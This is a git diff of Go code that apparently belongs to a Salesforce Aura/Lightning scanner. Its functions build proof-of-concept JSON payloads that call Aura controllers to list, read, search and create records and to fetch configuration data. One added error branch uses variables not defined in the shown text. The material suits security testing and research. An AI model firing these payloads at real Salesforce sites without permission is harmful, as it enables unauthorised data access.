@@ -9,7 +9,6 @@ type payload struct {
 	Massage json.RawMessage `json:"actions"`
 }
 
-
 func PayloadGeneratorGetItems(objectName string, page_size int, page int) []byte {
 
 	payload1 := `[{"id":"CirrusGo","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"`
@@ -32,7 +31,6 @@ func PayloadGeneratorGetItems(objectName string, page_size int, page int) []byte
 	return genPOC
 }
 
-
 func PayloadGeneratorGetRecord(recodeId string) []byte {
 
 	payload1 := `[{"id":"CirrusGo","descriptor":"serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord","callingDescriptor":"UNKNOWN","params":{"recordId":"`
@@ -53,7 +51,6 @@ func PayloadGeneratorGetRecord(recodeId string) []byte {
 
 }
 
-
 func PayloadGeneratorWritableOBJ(objectName string) []byte {
 
 	payload1 := `[{"id":"123;a","descriptor":"aura://RecordUiController/ACTION$createRecord","callingDescriptor":"UNKNOWN","params":{"recordInput":{"apiName":"`
@@ -72,7 +69,6 @@ func PayloadGeneratorWritableOBJ(objectName string) []byte {
 	}
 	return genPOC
 }
-
 
 func PayloadGeneratorSearchObj(objectName string, page_size int, page int) []byte {
 
@@ -96,22 +92,6 @@ func PayloadGeneratorSearchObj(objectName string, page_size int, page int) []byt
 	return genPOC
 }
 
-func PayloadGeneratorObjectList() []byte {
-
-	payload1 := `[{"id":"Cirrus","descriptor":"aura://HostConfigController/ACTION$getConfigData","callingDescriptor":"UHNKNOWN","params":{}}]`
-	finalpayload := []byte(payload1)
-	p := payload{
-		Massage: json.RawMessage(finalpayload),
-	}
-	genPOC, err := json.Marshal(p)
-	if err != nil {
-		panic(err)
-	}
-	return genPOC
-
-}
-
-
 func PayloadGeneratorAuraContext(fwuid string, app string, markup string) []byte {
 
 	payload1 := `{"mode":"PROD",`
@@ -126,12 +106,40 @@ func PayloadGeneratorAuraContext(fwuid string, app string, markup string) []byte
 	genPOC, err := json.Marshal(finalpayloads)
 
 	if err != nil {
+
+		payload2 := `"fwuid":"` + fwuid + `"`
+
+		payload4 := `"app":"` + app + `"`
+
+		payload6 := `"` + markup + `":"markupID"`
+
+		finalpayload := []byte(payload1 + payload2 + payload3 + payload4 + payload5 + payload6 + payload7)
+		finalpayloads := json.RawMessage(finalpayload)
+		genPOC, err := json.Marshal(finalpayloads)
+		if err != nil {
+			panic(err)
+		}
+		return genPOC
+	}
+
+	return genPOC
+
+}
+
+func PayloadGeneratorObjectList() []byte {
+
+	payload1 := `[{"id":"Cirrus","descriptor":"aura://HostConfigController/ACTION$getConfigData","callingDescriptor":"UHNKNOWN","params":{}}]`
+	finalpayload := []byte(payload1)
+	p := payload{
+		Massage: json.RawMessage(finalpayload),
+	}
+	genPOC, err := json.Marshal(p)
+	if err != nil {
 		panic(err)
 	}
 	return genPOC
 
 }
-
 
 func PayloadGeneratorDump() []byte {
 
